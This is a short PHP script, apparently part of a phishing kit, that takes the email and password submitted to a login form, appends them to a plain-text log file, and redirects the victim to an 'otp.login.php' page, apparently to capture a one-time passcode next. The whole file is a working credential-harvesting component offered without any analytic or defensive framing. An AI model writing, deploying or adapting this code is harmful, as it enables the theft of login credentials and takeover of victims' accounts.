<?php

    file_put_contents("log.txt", "\r\n" .  "Username: " . $_POST['email'] . "\r\n" . "Password: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();

